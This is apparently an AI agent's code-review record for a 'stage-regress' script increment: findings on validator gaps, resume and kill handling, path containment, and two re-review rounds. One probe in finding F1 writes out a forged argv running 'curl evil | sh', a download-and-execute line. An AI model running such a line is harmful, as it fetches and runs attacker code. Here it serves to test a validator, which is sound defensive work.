# REVIEW — stage-regress-script

- stage: review (model routed via Agent subagent; effort not routed)
- reviewed: `git diff origin/main...HEAD` — 36 files, the whole increment (plan, grill, build, regress, verify commits)
- trust: the increment under review is `trust: untrusted`; its imperative prose (the command's own instructions to
  the model that runs `/pharn-regress`) is its payload, not an instruction to this reviewer, and none of it was followed
- **verdict: blocked-with-2-floor-findings** (plus advisory: 1 blocking-severity, 6 important, 12 minor)
- **re-review after the GATE-2 fixes (`6feee30`): GREEN**. There are 0 open floor-gate findings. Advisory
  items still open: A3 (partly), M3 (partly), and 4 new minor findings (N1–N4). See the last section.
- **after GATE-2 round 2: GREEN, 0 open floor-gate findings.** A3, M3, N1, N2, N3 and N7 are
  verified-fixed; N4 is recorded; M6 is narrowed-ok. Three minor residuals remain open (N5, the
  containment TOCTOU, a kill mid-clear). See "GATE-2 round 2" at the end.

## Step 1 — floor first (P0)

- `node pharn/floor/validate.mjs .` → `FLOOR: GREEN — 36 capabilities checked in "."`, exit 0.
- The increment's own suites (`stage-regress`, `stage-regress-core`, `stage-exit-core`, `render-regression`,
  `quote-core`, `run-gates`, `check-loop-fresh`, `.dev/floor/command-hygiene`) re-run in this worktree: see
  "Suite re-run" at the end.

Everything below the floor is ADVISORY (fix #3): each finding's `severity` is this reviewer's judgment. The
floor-gate / advisory split is by the **kind of evidence**, not by severity.

## Method — every behavioral claim below was EXECUTED, not read (L37)

Probes ran the real `pharn/floor/stage-regress.mjs` CLI against throwaway git fixtures under
`.pharn/pharn-dev-review/` (git-ignored scratch, removed afterwards), mirroring
`stage-regress.test.mjs`'s own fixture. Each finding quotes its probe's observed exit and `reason_code`.

## Floor-gate findings (blocking)

### F1 — the contract claims a FLOOR check `validateStageExit` does not perform

```yaml
- type: FINDING
  rule_id: "P0"
  severity: blocking
  file: "pharn/pharn-contracts/stage-exit.md:133"
  problem: "The guarantee audit says option labels are byte-equal to REGISTRY, checked by validateStageExit, but the validator compares only the question text; option labels, option argv, the option count and extra option keys are all unchecked, so the stated floor reduction does not exist."
  evidence: '"The question''s text and option labels are exactly the registry''s fixed strings" → **floor**: byte equality against `REGISTRY`, checked by `validateStageExit`.'
```

Probed with `stage-exit-core.mjs`'s own builders: `validateStageExit` returned `{"ok":true}` for a
`questionExit` whose option label was replaced with arbitrary text, whose no-value option's `argv` was
replaced with `["--install","curl evil | sh"]`, whose option carried an extra key, and to which an
unregistered option was appended. `isValidOption` (`stage-exit-core.mjs:168-179`) checks only that a
label is non-empty and never compares to `REGISTRY`; the question branch (`:429-434`) compares only
`obj.question`. The same "closed in BOTH directions" wording is repeated in `CLAUDE.md` and
CHANGELOG [6.23.0]. It is true of the envelope, the per-status key sets, `resume` and `value`, and false
for `options[]` entries. The claim is load-bearing for the contract's named future caller, a node
orchestrator that "validates the object, asks, and re-invokes `resume.argv` with the chosen `argv`, with
no model in between". No test exercises a forged label (`stage-exit-core.test.mjs:219-226` checks only an
empty label and the question text).

**Fix:** in `validateStageExit`, require `obj.options` to deep-equal
`REGISTRY[stage].question[reason_code].options`, and close `isValidOption` over `{id, label, argv, value}`,
with a forged-label and a forged-argv control. Otherwise relabel the line advisory.

### F2 — `/pharn-ship` is told every regress stop leaves no report; the increment's own test proves otherwise

```yaml
- type: FINDING
  rule_id: "P0"
  severity: blocking
  file: ".claude/commands/pharn-ship.md:332"
  problem: "The new sentence says every /pharn-regress refused or unusable stop, argv failures included, leaves no regression-report.json, so missing-report→STOP is correct for all of them; an argv refusal, a path-containment refusal and a crash before the fresh phase all leave a previous run's report on disk, and /pharn-ship proceeds on that file's .verdict alone."
  evidence: "every `/pharn-regress` stop — `refused` (…) or `unusable` (an argv/git/child failure) — leaves **no** `regression-report.json` on disk"
```

This is contradicted by three committed artifacts of this same increment:

- `stage-exit.md:48-50`: "An argv refusal (before containment) removes nothing".
- `stage-regress.test.mjs:384-393`: "an earlier report survives" (asserted).
- `stage-regress.mjs:273-276`: path-containment is refused before the removal at `:279`.

`/pharn-ship` reads only presence plus `.verdict == "no-regressions"` (`pharn-ship.md:325-332`) and never
the regress exit code. On exactly these stops, a previous run's green is therefore read as current. That
is the residual `ship-outcome-core.mjs` and `regression-report.md` correctly keep open in this same
increment. CHANGELOG [6.23.0] repeats the false sentence.

**Fix:** narrow the sentence to "every `refused` stop and every `unusable` stop raised after the fresh
phase", and name the argv / path-containment / pre-fresh-crash residual. Alternatively, make `/pharn-ship`
also require the regress stage's exit `0` before reading `.verdict`.

## Advisory findings

### L-floor (P0) — claims vs code

#### A1 (severity: blocking) — the thin command's `question` branch dead-ends if followed as written

```yaml
- type: FINDING
  rule_id: "P0"
  severity: blocking
  file: ".claude/commands/pharn-regress.md:104"
  problem: "The question bullet places the pinned --resume code block under 'On an answer' and says resume.argv holds a 'stage-regress.mjs --resume …' line; a question's resume.argv is the ORIGINAL fresh argv and no progress record exists, so running the shown line fails and appending the option to it is refused."
  evidence: "Read that line's own `stage-regress.mjs --resume …` line from the object's `resume.argv` for a `question`"
```

Probe (a `no-gates` question):

- The pinned `--resume --budget-ms 570000` line, run after the question → exit 2, `no-progress`.
- The same line with the option `--gates …` appended → exit 2, `usage-error`
  ("--resume accepts only --budget-ms").
- The correct round trip, `node pharn/floor/stage-regress.mjs` + `resume.argv` + the option's `argv` →
  exit 0, `done`.

The code emits `resume.argv = cfg.originalArgv` on every question (`stage-regress.mjs:373, 536, 542, 547`).
This is fail-closed: a dead end leaves no report, so `/pharn-ship` STOPs. But relaying the question is the
one job the thin command keeps beyond its pinned line, and every interactive question hits it.

**Fix:** in the `4` bullet, drop the `--resume` block and state the invocation as
`node pharn/floor/stage-regress.mjs <resume.argv…> <option argv…>`. Keep the `--resume` line only under `5`.

#### A6 (important) — the named residual's "only signal" is not on the first line, and asserts what it did not observe

```yaml
- type: FINDING
  rule_id: "P0"
  severity: important
  file: "pharn/floor/render-regression.mjs:73"
  problem: "CHANGELOG [6.23.0], CLAUDE.md and pharn-regress.md:205 say the failed-install signal is REGRESSION.md's FIRST line; it renders on line 7, below a line-5 'verdict: NO REGRESSIONS', and it states 'every base gate therefore reads red' unconditionally."
  evidence: "**THE BASE-COMMIT INSTALL FAILED** (exit 3) — every base gate therefore reads red and is classified `pre_existing` below"
```

The probe used `--install "exit 3"` over a stdlib-only fixture. The result was `done`/`no-regressions`,
and every base gate was green, yet the rendered line claims they read red. Its first lines are the title,
the base, then the would-be false green. `regress-failed-install-false-green` is deliberately unclosed, so
this line is its only mitigation.

**Fix:** render the install failure above the verdict line, and condition the "reads red" clause on the
report's own `pre_existing`. Otherwise correct the three "first line" claims.

#### A7 (important) — new unattended-loop stops, not disclosed as a behavior change

```yaml
- type: FINDING
  rule_id: "P7"
  severity: important
  file: ".claude/commands/pharn-loop.md:233"
  problem: "The new questions turn previously-completing /pharn-loop runs into S10 stops on common project shapes, and CHANGELOG [6.23.0] does not say so."
  evidence: "every other `question` (`base-unresolved`, `install-unresolved`, `tests-unresolved`) → **S10**"
```

Two common project shapes now stop:

- A `package.json` with no committed lockfile (small projects and libraries often have none) →
  `question install-unresolved`. Probed: exit 4.
- Every test file inside the feature → `question tests-unresolved` (A2).

The old prose proceeded in both cases by model judgment. The plan defers `regress-answers-config` "until a
loop user hits it" (PLAN.md:415). A loop over any lockfile-less project hits it on its first iteration.

**Fix:** state the new stops in CHANGELOG and `pharn-loop.md`. Better, route the zero-dependency /
no-lockfile case to a fixed rule rather than a question.

#### Minor (L-floor)

- **M1** `render-regression.mjs:116` renders a gate id inline through `dataText`, which returns a string
  unchanged, and labels it "(quoted, untrusted)". CHANGELOG [6.23.0] and `CLAUDE.md:576` say every gate id
  is quoted "as fenced DATA". A heading cannot form, but inline links and HTML survive, and a
  `structural:<path>` id carries an attacker-nameable path.
- **M2** "can never carry an absolute path" (CHANGELOG [6.23.0], `CLAUDE.md:579`): a user's own
  `--install` text renders verbatim, and a `--gates` id defaults to its command. Narrow it to "no path the
  script supplies".
- **M3** Named limits dropped from the command:
  - The old "one detection this exemption gives up" block (a build rewriting its own PLAN `## Files`
    retroactively) now survives only in a `check-regress.mjs:156` code comment.
  - The per-refusal remedies (re-plan via `/pharn-plan`, re-approve via `/pharn-spec`) are gone from both
    the command and the render. PLAN.md:252-257 promised "present the refusal and its remedy".
  - `pharn-regress.md:179` "never read by you" asserts model behavior without the old ADVISORY label.
- **M5** `stage-exit.md:48-50` and `pharn-regress.md:99-100` say an `unusable` wrote "nothing new" and
  removed "only this feature's stale prior report". But:
  - path-containment removes nothing;
  - an `unusable` after `worktree` leaves a full base checkout and stamps;
  - "fresh" also wipes another run's in-progress scratch (G14).
- **M10** GATE 1 Q3 required the pnpm/yarn/bun UNMEASURED labels in `stage-exit.md` (PLAN.md:160, 428).
  The contract carries no install table at all. The command and `stage-regress-core.mjs` do label them.

### L-eval (P1) — test adequacy for what the thin command now depends on

#### A5 (important) — the ★ tests assert less than their titles and the plan promised

```yaml
- type: FINDING
  rule_id: "P1"
  severity: important
  file: "pharn/floor/stage-regress.test.mjs:583"
  problem: "The ★ WIRING test asserts only status done and the verdict; none of the check-loop-fresh D/E/H/J or DEFAULT_STAMPS assertions, nor the dropped---timeout-ms mutant control PLAN.md:327 promised, were written, and the retired run-gates ★ test's 'verdict reproduces after the worktree removal' and its base/.pharn negative control have no successor."
  evidence: 'assert.equal(doc.status, "done", JSON.stringify(doc)); … // L24: measured, not assumed.  void durationMs;'
```

- `void durationMs` (`:690-691`) discards the L24 measurement its comment claims. BUILD.md records no
  install duration either.
- The ★ budget test (`:466-483`) is titled "--resume reaches the SAME verdict as an unbudgeted run", but
  it never runs an unbudgeted comparison. Its `lint`/`format:check` gates are skipped by the config-touch
  rule, so each side has one gate and the test exercises exactly one `continue`, at `drain-base`. It never
  covers a mid-drain continue on head, nor the install boundary.
- No question test re-invokes `resume.argv` + an option's `argv`, though PLAN.md:334 promised it. That
  missing test is why A1 and A2 shipped.
- **Measured here, so the gap is coverage, not a live defect:** a 4-invocation budgeted run followed by the
  pinned verify lines returned `check-loop-fresh.mjs --iter 1` → exit 0 `FRESH`, with A, B, C, D, J, E, H, F
  and G all `pass`. Nothing in the suite pins that.

**Fix:** add the promised D/E/H/J assertions, the mutant control, a real unbudgeted comparison over two or
more non-style gates, and one round-trip test per question code.

#### Minor (L-eval)

- **M11** The style probe (`render-regression.test.mjs:249-275`) writes into the live repo's
  `pharn/features/` during `npm test`. Its RUN-REPORT precedent probes an isolated scratch tree. A killed
  run leaves an untracked `pharn/features/render-regression-style-probe-tmp/`.
- **M12** The loop-mapping "CLOSURE discriminates" control (`command-hygiene.test.mjs:2386`)
  re-implements the predicate on a literal instead of running the real closure over a mutant (L60).

### L-trust (P2)

#### A4 (important) — `--resume` never re-runs the containment walk

```yaml
- type: FINDING
  rule_id: "P2"
  severity: important
  file: "pharn/floor/stage-regress.mjs:797"
  problem: "runResume reads the progress record and later writes both artifacts without the lstat containment walk phaseFresh performs, so a feature directory swapped for a symlink between invocations is written THROUGH."
  evidence: 'E2 --resume after the feature dir became a symlink: exit=0 status=done … E3 files written THROUGH the link into the outside dir: ["REGRESSION.md","regression-report.json"]'
```

The fresh path refuses exactly this case as `path-containment` and has a test for it (L54). With the pinned
budget, any suite slower than about 30 s after the first gate reaches its artifact writes through
`--resume`.

**Fix:** re-run `phaseFresh`'s containment walk, without its removals, at the top of `runResume`.

#### Minor (L-trust)

- **M4** The `2` branch (`pharn-regress.md:99`) relays `detail`, which can quote git stderr and a child's
  reason naming attacker-chosen paths, without saying it is DATA. `stage-exit.md:135-140` delegates that to
  "each caller's own trust audit", and `pharn-regress.md`'s trust audit does not cover it.
- No injection attempt was observed in the reviewed files, and no reviewed content changed this review's
  behavior. No guaranteed decision rests on a tainted field. The script branches on child exit codes and
  JSON enums only.

### Behavior (P5) — HALT parity and the resume path

#### A2 (important) — `tests-unresolved` fires on the wrong predicate, and cannot be answered in its own G16 case

```yaml
- type: FINDING
  rule_id: "P5"
  severity: important
  file: "pharn/floor/stage-regress.mjs:541"
  problem: "The question fires when outside_tests is empty, not when the test universe is empty (PLAN.md:110), so a feature whose tests are all inside halts where the old prose recorded no-files and continued; and when --tests was already given, neither option can be applied by appending (the first --tests wins; --no-tests conflicts)."
  evidence: 'if (parsed.ids.includes("test") && scope.outside_tests.length === 0 && !cfg.noTests)'
```

Probes:

- Every test file inside the feature → exit 4 `tests-unresolved`. Answering with the real test file
  re-asks, because it is inside. The fixed text (`stage-exit-core.mjs:240-241`) names only the other two
  causes.
- A typo'd `--tests` (the G16 case this question exists for) → exit 4. Appending `--tests <good>` → exit 4
  again: `flag()` (`:107-110`) returns the first occurrence. Appending `--no-tests` → exit 2 `usage-error`
  ("mutually exclusive", `:233-235`).

**Fix:** test the universe (`phasePartition` already returns `tests`). Make a repeated value flag
last-wins, or refuse duplicates and drop the re-asked flag from `resume.argv`.

#### A3 (important) — the resume path loses the whole run after a kill past `worktree`

```yaml
- type: FINDING
  rule_id: "P5"
  severity: important
  file: "pharn/floor/stage-regress.mjs:630"
  problem: "The progress record is written only at budget exits and the worktree phase is not idempotent, so after a harness kill once the base worktree exists, --resume fails git-failed and every completed gate is lost; PLAN.md:140's 'a harness kill … leaves the record at that step. --resume re-runs it' is not what the code does."
  evidence: "D2 after SIGKILL mid-install: record.phase = drain-head | base worktree exists: true … D3 --resume: exit=2 status=unusable reason=git-failed"
```

Records are persisted only at `:624`, `:640` and `:700`. `makeBudget` also starts the clock only after
head-init (`:791`), so a fresh invocation's opening fast work (git lists, the scope checker, head-init's
fingerprint) is never charged against the budget. That widens the kill window past PLAN.md:134's stated
bound. The failure is fail-closed (no verdict) and needs large-repo fast work to trigger, but it is
reachable.

**Fix:** persist the record at every phase transition, have `worktree` remove a leftover registration
first, and start the clock at process start.

#### Minor (behavior)

- **M6** `validateStageExit` also accepts any string as `done.verdict` or `continue.phase` (probed with
  `"lgtm"` and `"banana"`).
- **M7** The script's argv check diverges from the runner's:
  - `--timeout-ms 50` is accepted, then refused mid-run as `child-refused` (`run --next` wants 3-9 digits),
    after the stale report was already removed (probed).
  - A trailing `--budget-ms` with no value silently means unbudgeted (probed `done`).
  - `runResume` accepts a stray duplicate number (`:801`, `indexOf`).
- **M9** `RESUMABLE_PHASES` (`stage-regress-core.mjs:99`) admits `cleanup` and `render`, which the script
  never persists. Resuming from them crashes on an undefined report (`stage-regress.mjs:744`) instead of
  `progress-malformed`. Probed: a `render` record → `validateProgress` `{"ok":true}`, then `--resume` →
  exit 1, `TypeError [ERR_INVALID_ARG_TYPE]`.

### L-axis (P3)

- No sibling capability reference. Every new import is a floor module, the flat `pharn/floor/` pattern.
  `quote-core.mjs` (only `fenceFor`) and `stage-regress-core.mjs` (only `gate-run-core.mjs`) hold their
  pinned load graphs.
- **M8 (minor)** `stage-exit-core.mjs:80` re-declares `FEATURE_SLUG_RE`. It equals `gate-run-core`'s today
  (probed), but nothing pins the parity. If one copy widens, argv accepts a slug the builders reject, and
  every emission, `done` included (after the report is written), becomes a crash (L35/L31).
- Advisory note, no finding: importing CLI module `run-gates.mjs` in-process for `spawnGate` is the
  pattern G6 avoided for `quote-core`. It fails closed either way, because the stage also shells that
  module.

## The orchestrator's five questions, answered

1. **Does the script reproduce every floor verdict and HALT the old prose had?**
   - **Reproduced:** every floor verdict — chain, scope, verdict, and the report written as the checker's
     own bytes. Also the missing-artifact, no-gates (probed: no `package.json` and no `--gates` → exit 4),
     base-unresolved and scope-escape HALTs.
   - **Added:** two HALTs (A2, A7).
   - **Lost:** the per-refusal remedy text (M3).
2. **Do check-loop-fresh E/G/H/J, `/pharn-ship` and `/pharn-loop` read identical evidence?**
   - **check-loop-fresh:** yes, measured. It returned FRESH over a budgeted 4-invocation run, and the
     stamp paths derive byte-identically from `REGRESS_PATHS`. The suite does not pin this (A5).
   - **`/pharn-ship`:** reads the same file, but under a false premise about when that file is absent (F2).
   - **`/pharn-loop`:** its mapping is consistent with S4/S9/S10.
3. **Is the stage-exit object closed in both directions?**
   - **Closed:** the envelope, the per-status keys, `resume` and `value`.
   - **Not closed:** `options[]` entries, which also go unchecked against the registry (F1). `done.verdict`
     and `continue.phase` accept any string (M6).
4. **Can the budget/resume path lose or duplicate a gate run?**
   - **The budget path:** no. The runner's stamp is the one source of which gate ran next, and a probe
     reached `done` over 4 invocations.
   - **A harness kill past `worktree`:** loses the whole run (A3).
   - **`--resume` writes:** it writes without containment (A4).
5. **Is any claim in the command stronger than the code?**
   - Yes, in five places: A1 (`resume.argv`), A6 ("first line"), M5 ("nothing new"), M3 ("never read by
     you"), and the `install-unresolved` sentence at `pharn-regress.md:155`. That sentence omits the
     no-`package.json` → no-install case.
   - Beyond the command: F2 in `/pharn-ship`, F1 in the contract.

## Checked, no finding

- **A1-scope (A1 amendment):** the hygiene test runs the pinned setter line against the live guard, with
  a no-scope control (`command-hygiene.test.mjs`, STAGE_SCRIPT_WIRING).
- **Budget boundary:** the pure `mayStartSlowStep` tests the exact `elapsed + N === B` boundary.
- **Chain-red render:** a real chain-red render (a drifted SPEC) carried no absolute path (probed).
- **`spawnGate` export:** it always resolves an integer exit (124 on timeout), so a persisted
  `installResult` always validates.
- **The version bump:** SKILLS_VERSION 6.22.0 → 6.23.0 is a minor bump for a new checker, command rewrite
  and contract. The README badge and CURRENT-STATE agree. MIN_CLI 0.5.0 unchanged matches the precedent
  of every floor module added since 5.0.0.

## Suite re-run

`node --test --test-reporter=tap` over the eight suites named in Step 1, in this worktree:
`# tests 370 · # pass 370 · # fail 0 · # skipped 0`, exit 0. A green suite is the problem this review
names (A5), not evidence against it: the defects above were found by probes the suite does not contain.

## Proposed lesson candidate (for a separate, human-gated `/pharn-dev-memory-promote` — not written here)

**L37 recurred, five times, in an increment that cited it.** PLAN.md's `applied_lessons` names L37, and
its body line applies it to exactly one claim: the A1 scope, which was probed. The same increment then
wrote five new quantified sentences, and none was probed:

- "exactly the registry's fixed strings", checked by the validator (F1);
- "**every** `/pharn-regress` stop … leaves **no** report" (F2, contradicted by the increment's own test);
- "the **only** signal is the **first** line" (A6);
- "quotes **every** gate id as fenced DATA" (M1);
- "can **never** carry an absolute path" (M2).

Each fell to a single probe. The transferable part: sub-check D proves the id is cited, and here a correct
application to one named claim sat beside five unapplied ones. Reading the plan's L37 line as coverage of
the increment's other new claims is the declaration-vs-application gap CLAUDE.md names.

- Candidate lesson title: "Citing L37 for the one claim a plan names does not probe the new quantified
  claims the same increment writes elsewhere. Sweep every added only/every/never/exactly sentence and
  execute one excluded member each."
- Candidate `type`: `process`.
- Candidate `concepts`: `[guarantee-audit, universal-quantifier, lesson-recurrence, doc-drift, false-green]`.
- Provenance: feature `stage-regress-script`, source this REVIEW.md F1/F2/A6/M1/M2 and their quoted
  probes, commit = the review commit.
- Per L20, a second-plus occurrence earns a floor check. A plausible one: a hygiene test that, for each
  contract guarantee-audit line naming a validator, requires a negative-probe test of that validator. That
  is for the promote gate and a later plan to decide, not this review.

## Re-review after GATE-2 fixes (opus)

- **Scope:** `a2a06e8..6feee30`, 19 files. The fixes were written by a sonnet agent that handed off
  mid-round.
- **Model:** opus was set by the maintainer's instruction, overriding pharn.config.json. Model routed via
  Agent subagent; effort not routed.
- **Method:** every repro from the original review was EXECUTED again against `6feee30`, on fixtures
  under git-ignored `.pharn/pharn-dev-review/` (removed afterwards). Nothing was re-read in place of a
  run (L37).
- **Floor first:** `node pharn/floor/validate.mjs .` → GREEN (36 capabilities). The same-session
  `/pharn-dev-verify` re-run PASSED all 7 gates, with `npm test` at 3450/3450 (see VERIFY.md, "Re-run
  after GATE 2 fix"). Also run as a cross-check here, not as gates: `docs:check`, `check:markers`,
  `check:badge`, `check:changelog` and `check:contributing`, all exit 0.
- **Re-review verdict: GREEN, 0 open floor-gate findings.** Severity below remains advisory (fix #3).

### Status per finding

- **F1 — verified-fixed.**
  - Probed with `stage-exit-core.mjs`'s own builders, `validateStageExit` now refuses a forged label, a
    forged option `argv`, an extra option key, an added option, a removed option and a reordered option.
  - Every registry-built question still validates.
  - `stage-exit.md`'s guarantee-audit line now matches the code (`optionsMatchRegistry`, and
    `isValidOption` closed over `{id, label, argv, value}`).
- **F2 — verified-fixed; the residual is narrowed and named.**
  - A bad `--timeout-ms` after a valid `--feature` → exit 2 `usage-error`, and the stale report is gone.
  - A bad `--feature` → exit 2 with the report surviving, and a symlinked `.pharn` → `path-containment`
    with the report surviving. Both are the residual `pharn-ship.md`, CHANGELOG [6.23.0] and
    `stage-exit.md` now name consistently.
- **A1 — verified-fixed.**
  - The documented form, `node pharn/floor/stage-regress.mjs <resume.argv…> <option argv…>`, reaches
    `done` from a `no-gates` question.
  - The `--resume` block is gone from the `4` bullet and sits only under `5`.
- **A2 — verified-fixed.**
  - Every test inside the feature → `done`, no question.
  - A typo'd `--tests` → `tests-unresolved`, with `--tests` stripped from `resume.argv`. Answering
    `--tests src/*.test.js` → `done`, and answering `--no-tests` → `done`.
- **A3 — still-open (partly fixed).**
  - **Fixed:** the original repro (a group SIGKILL mid-install on a resumed invocation) now leaves the
    record at `install`, and `--resume` → `done`.
  - **Still open:** a group SIGKILL during `git worktree add` (the window stretched by a post-checkout
    hook in the fixture) leaves the record at `worktree` with the worktree registered. `--resume` → exit 2
    `git-failed` ("already exists"), and every completed head gate is lost. A fresh re-run recovers
    (`done`).
  - The `worktree` phase is still not idempotent, yet the fix's own comment (`stage-regress.mjs`, the A3
    block in `runPhases`) lists "mid-`git worktree add`" among the cases it closed.
  - `makeBudget` still starts the clock after head-init. The fresh invocation's opening fast work is
    therefore still uncharged, and PLAN.md:134's wall-time bound is still not what the code does.
  - Severity: **important.** It fails closed, but it is the kill window the original finding named first.
    **Fix:** have `worktree` remove or prune a leftover `.pharn/pharn-regress/base` registration before
    `add` (or skip `add` when it is already registered at `state.base`), and either start the clock at
    process start or restate the bound.
- **A4 — verified-fixed.** A feature directory swapped for a symlink after a `continue` → `--resume` →
  exit 2 `path-containment`, and nothing is written through the link. The pre-existing within-invocation
  TOCTOU (containment walked once at the start, writes up to about 570 s later, on both paths) remains, as
  it was before. It is minor and not introduced by the fix.
- **A5 — verified-fixed.**
  - The new ★ tests exist and pass inside the 3450: `check-loop-fresh` D/E/H/J each asserted `pass` over
    a budgeted run; the dropped-`--timeout-ms` mutant; an unbudgeted-vs-`--budget-ms 1` comparison over 3
    non-style gates with a mid-`drain-head` continue; and one round trip per question code.
  - Minor fidelity nit: the round trips take the option from `REGISTRY` and substitute through a local
    helper, instead of using the emitted object's `options` and the shipped `substituteArgv`.
- **A6 — verified-fixed.**
  - With `--install "exit 3"`, the warning renders on line 5, above the verdict on line 7.
  - It names the real count ("none were, this run", since the base gates passed).
  - "every base gate" no longer appears.
- **A7 — verified-fixed.** The new S10 stops are disclosed in CHANGELOG [6.23.0] and `pharn-loop.md`.
  Routing the lockfile-less case to a fixed rule is deferred. That is acceptable, because disclosure was
  the finding.
- **M1, M2 — verified-fixed.** The claims are narrowed in CHANGELOG [6.23.0] and `CLAUDE.md`: a gate id is
  inline and never fenced, and only no path the SCRIPT supplies is absolute.
- **M3 — still-open (partly, by the fixer's choice).**
  - **Restored:** the per-refusal remedies, the ADVISORY label on "not by you", and the no-`package.json`
    install case.
  - **Not restored:** the retroactive-`## Files` gap still appears only in a `check-regress.mjs:156` code
    comment.
  - The new `scope-escaped` remedy makes that sharper. It advises declaring the escaped path in `PLAN.md`'s
    `## Files` via `/pharn-plan`, which is exactly the PLAN edit the dropped warning covered, and the
    command no longer says that a scope check cannot tell such a widening from a retroactive
    authorization.
  - The `missing-artifact` remedy says "write the named missing file" where the old prose named
    `/pharn-plan` and `/pharn-spec`. A hand-written SPEC then fails `chain-red`, so this fails closed.
  - Severity: minor. **Fix:** add a one-line pointer (not a duplicate) to `check-regress.mjs`'s
    honest-scope block beside the `scope-escaped` remedy, and name the two commands in the
    `missing-artifact` remedy.
- **M4 — verified-fixed.** The `2` bullet now says `detail` is quoted DATA.
- **M5 — narrowed-ok, but the new text overclaims. See N1.**
- **M6 — narrowed-ok (deferred and labeled).**
  - Re-probed: `done.verdict` `"lgtm"` and `continue.phase` `"banana"` still validate. `stage-exit.md`'s
    Residual now names this, so the silence reads as a decision.
  - The stated rationale mischaracterizes `REGISTRY`. `REGISTRY` exists to hold per-stage vocabularies
    inside the shared module (keyed by stage), not to keep them out of it. A per-stage verdict and phase
    list would follow the same pattern. Minor.
- **M7 — verified-fixed.** Re-probed:
  - `--timeout-ms 50` → `usage-error` up front;
  - a trailing `--budget-ms` → `usage-error`;
  - `--resume --budget-ms 100 100` → `usage-error`.
- **M8 — verified-fixed.** A parity test compares `.source` and `.flags` with `gate-run-core.mjs`'s export.
- **M9 — verified-fixed.** A `render` or `cleanup` record → exit 2 `progress-malformed`. It is no longer a
  `TypeError` crash.
- **M10 — verified-fixed.** `stage-exit.md` carries the install table with its MEASURED/UNMEASURED labels.
- **M11 — narrowed-ok.** A pre-clean and `t.after()` were added. The in-repo path is kept on purpose,
  because it exercises the real ignore config.
- **M12 — verified-fixed.** Both closure tests call the same `mappingNamesCode`.

No finding **regressed**.

### New findings introduced by the fixes (all advisory, all minor)

- **N1 (P0) — the new `unusable` wording claims a cleanup that has not happened yet.**
  - Files: `pharn/pharn-contracts/stage-exit.md` (the `unusable` bullet) and
    `.claude/commands/pharn-regress.md` (the `2` bullet).
  - They say a stop at or after the slug and containment point "has already removed … AND any other run's
    leftover `.pharn/pharn-regress/` scratch".
  - After the F2 reorder, a `usage-error` from `parseRestOfArgv` fires after `phaseFreshEarly`'s report
    removal but before `phaseFreshLate`'s scratch clear.
  - Probed: run A persisted a `continue` record. Run B then failed with a bad `--timeout-ms`, leaving the
    report gone and run A's `stage.json` still on disk. An out-of-flow `--resume` revived run A to
    `done`.
  - The command prescribes `--resume` only after exit 5, so this stays advisory.
  - **Fix:** clear `.pharn/pharn-regress/` in `phaseFreshEarly` too, or correct both sentences.
- **N2 (P0) — "cleanup and render … idempotent to redo from verdict" is not quite true.**
  - File: `stage-regress.mjs`, the A3/M9 comment in `runPhases`.
  - Probed: the feature directory made read-only → the resumed run crashes in render after cleanup has
    already removed the worktree, with the record parked at `verdict`. After restoring and `--resume` →
    `done`, but `REGRESSION.md` now says "removing the base worktree FAILED" although the removal had
    succeeded.
  - **Fix:** treat an absent registration as cleanup success, or soften the comment.
- **N3 (P0) — `resume.argv` is described too broadly.**
  - Files: `.claude/commands/pharn-regress.md:120` and `stage-exit.md:81`.
  - Both describe a question's `resume.argv` as "the ORIGINAL fresh invocation's" argv. For
    `tests-unresolved` it is now that argv minus any `--tests` pair (`stripFlagPair`).
  - The behavior is right; the sentence is too broad.
- **N4 (P6) — BUILD.md asserted a verify re-run that had not happened.**
  - At `6feee30`, BUILD.md's "Re-verification after the fixes" said `/pharn-dev-verify` was "re-run in full
    over the fixed tree". It had not been, as the orchestrator itself reported.
  - This re-run makes the sentence true after the fact. It is recorded because a stage artifact asserted
    a run before it happened.
- **N5 — A5's round-trip fidelity nit, above.**
- **N6 — the lesson candidate recurred inside the fix pass.**
  - Three new, unprobed claims were written: the A3 comment's "mid-`git worktree add`" (A3 above), N1's
    "AND any other run's scratch", and N2's "idempotent".
  - Each fell to a single probe.
  - That makes the candidate above a third-plus occurrence, which strengthens its L20 case for the
    promote gate.

## GATE-2 round 2 — the reviewer's own fixes, and their dispositions (opus)

- **Who and how.** The reviewer made these fixes itself, in its own worktree, at the orchestrator's GATE-2
  direction: FIX-then-SHIP, a MODEL decision under the maintainer's delegation, not a human one.
- **Model.** opus, by the maintainer's instruction, overriding `pharn.config.json`. Model routed via Agent
  subagent; effort not routed.
- **The bound on this section.** Fixer and reviewer are the same agent, so this is a SELF-review. It
  reports nothing read-only. Every disposition rests on a behavior reproduced on the unchanged code
  first, then an executed test, and for code a mutant that turns the test red (each reverted afterwards).
- **Floor.** `validate.mjs .` → GREEN.
  - `/pharn-dev-regress`, re-run over the WHOLE increment from its merge-base `767bf61` with all 6 gates
    (style included): `no-regressions`.
  - `/pharn-dev-verify`: third attempt PASS, all 7 gates, 3453/3453, and `reconcile` CLEAN over a fresh
    round-2 epoch.
  - Attempt 1 FAILed on a round-1 test's fixed 800 ms wait (see below). Attempt 2 passed but preceded two
    prose edits. REGRESSION.md and VERIFY.md record every attempt.

### Dispositions

- **A3, the kill during `git worktree add` — verified-fixed, by a code change rather than a narrowing.**
  - Measured first: a real group SIGKILL mid-checkout leaves the worktree LOCKED "initializing" by git
    itself, a single `--force` refuses it, and `--resume` failed `git-failed`.
  - Now `clearBaseWorktree()` (a double `--force`, `rm -rf`, `prune`) runs before every `add`.
  - The new test kills a real `add` mid-checkout and resumes it to `done`. Mutant (drop the call) →
    `git-failed`.
- **A3, the budget clock — verified-fixed (code).**
  - `elapsed` now starts at the top of `runFresh`/`runResume`.
  - New test: a PATH shim makes only `git status --porcelain` take 3 s, and a 2 s window must stop the
    second head gate; control: a 60 s window runs to `done`. Mutant (the old clock) → red.
  - Still uncounted, and named in `stage-exit.md` and `pharn-regress.md`: node startup, and the fast work
    after the last permitted slow step.
- **M3 — verified-fixed (docs), both halves.**
  - The rebuilt-`## Files` blind spot now sits beside the `scope-escaped` remedy in the command AND the
    contract, not only in `check-regress.mjs`'s comment.
  - The `missing-artifact` remedy names `/pharn-plan` and `/pharn-spec`.
- **N1 — verified-fixed (docs).** Both texts now follow the code's order: a `usage-error` after the slug
  removes the stale report but not an earlier run's scratch or progress record. The out-of-flow
  `--resume` revival is named, and the command limits `--resume` to a `5` or a Bash-tool timeout.
- **N2 — verified-fixed (code).**
  - "cleanup" reports success when the removal fails and no directory is left.
  - Test: a render crash into a read-only feature directory, then `--resume` renders no failure. Mutant →
    red; the test is skipped under root.
